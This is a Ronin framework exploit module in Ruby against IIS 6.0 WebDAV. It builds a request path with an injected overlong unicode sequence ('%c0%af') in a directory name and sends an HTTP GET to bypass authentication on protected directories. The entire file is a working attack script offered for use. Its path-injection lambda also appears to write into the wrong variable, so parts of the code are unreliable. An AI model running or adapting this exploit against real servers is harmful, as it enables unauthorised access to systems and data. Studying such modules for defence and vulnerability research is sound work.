#!/usr/bin/env ronin-exploit -f

require 'ronin/exploits/http'

Ronin::Exploits::HTTP.object do
  #
  # Cacheable data.
  #
  cache do
    self.name = 'IIS 6.0 WebDav unicode auth bypass'
    self.version = '0.1'
    self.description = %q{
      A unicode sanitization flaw exists in the WebDav handling code
      in IIS 6.0, allowing for a bypass of authentication.
    }

    author :name => 'Postmodern', :organization => 'SophSec'

    targeting do |t|
      t.targets_os       'Windows'
      t.targets_software 'IIS', '6.0'
    end
  end

  parameter :inject,
            :default => '%c0%af',
            :description => 'Unicode to inject into a directory name'

  parameter :bypass_dir,
            :description => 'Directory to by-pass authentication'

  parameter :url_path, :description => 'The URL Path to request'

  build do
    require_params :url_path

    dirs = @url_path.split('/')
    inject_at = lambda { |index|
      dir = dirs[index]
      inject_index = 1 + rand(dir.length - 2)

      dir[index] = dir[0...inject_index] + 
                   @inject + 
                   dir[inject_index..-1]
    }

    unless @bypass_dir
      inject_at.call(0)
    else
      dirs.each_with_index do |dir,index|
        if dir.include?(@bypass_dir)
          inject_at.call(index)
          break
        end
      end
    end

    @vuln_path = dirs.join('/')
  end

  deploy do
    http_get_body(:path => @vuln_path)
  end
end
